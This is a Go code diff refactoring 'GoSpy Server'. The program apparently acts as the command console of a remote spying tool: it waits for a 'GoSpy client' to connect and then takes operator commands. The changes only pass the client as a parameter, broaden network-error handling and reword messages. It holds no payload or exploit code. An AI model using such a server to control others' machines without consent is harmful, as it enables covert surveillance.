@@ -19,9 +19,7 @@ const banner = `
   \___\___/___/ .__/\_, | |___/\___|_|  \_/\___|_|  
               |_|   |__/              v0.0.1`
 
-var spyClient client.GoSpyClient
-
-func executor(in string) {
+func executor(spyClient *client.GoSpyClient, in string) {
 	in = strings.TrimSpace(in)
 	blocks := strings.Split(in, " ")
 
@@ -45,8 +43,8 @@ func executor(in string) {
 		}
 	}
 
-	if _, isNetErr := err.(*net.OpError); isNetErr == true || err == io.EOF {
-		fmt.Println("Client dropped, waiting for reconnect...")
+	if _, isNetErr := err.(net.Error); isNetErr == true || err == io.EOF {
+		fmt.Println("Network error detected, dropping client and waiting for reconnect...")
 		_ = spyClient.CloseConn()
 		_ = spyClient.WaitForConn()
 		fmt.Println("Successful reconnect from client")
@@ -61,7 +59,7 @@ func main() {
 	fmt.Printf("Listening on %s\n", bindAddr)
 	fmt.Println("Waiting for connection from GoSpy client...")
 
-	spyClient = client.NewGoSpyClient(bindAddr)
+	spyClient := client.NewGoSpyClient(bindAddr)
 	err := spyClient.WaitForConn()
 	if err != nil {
 		fmt.Printf("Error listening on given address: %s\n", err.Error())
@@ -70,8 +68,8 @@ func main() {
 
 	fmt.Println("Successful connection from client")
 	prompt.New(
-		executor,
+		func(in string) { executor(&spyClient, in) },
 		serverprompt.Completer,
-		prompt.OptionTitle("GoSpyServer"),
+		prompt.OptionTitle("GoSpy Server"),
 	).Run()
 }
